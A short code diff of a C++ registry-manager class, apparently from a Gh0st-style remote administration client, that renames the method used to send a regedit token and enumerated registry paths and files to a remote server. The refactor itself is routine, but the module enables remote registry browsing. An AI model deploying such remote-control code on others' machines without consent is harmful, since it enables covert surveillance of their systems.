@@ -13,7 +13,7 @@
 CRegisterManager::CRegisterManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
 {
 	BYTE bToken=TOKEN_REGEDIT;
-	m_ClientObject->OnServerSending((char*)&bToken, 1);  
+	m_ClientObject->Send2Server((char*)&bToken, 1);
 }
 
 CRegisterManager::~CRegisterManager()
@@ -47,7 +47,7 @@ VOID CRegisterManager::Find(char bToken, char *szPath)
 	char *szBuffer= Opt.FindPath();
 	if(szBuffer!=NULL)
 	{
-		m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
+		m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
 		//目录下的目录
 		LocalFree(szBuffer);
 	}
@@ -55,7 +55,7 @@ VOID CRegisterManager::Find(char bToken, char *szPath)
     if(szBuffer!=NULL)
 	{
 		//目录下的文件
-		m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));
+		m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
 		LocalFree(szBuffer);
 	}
 }
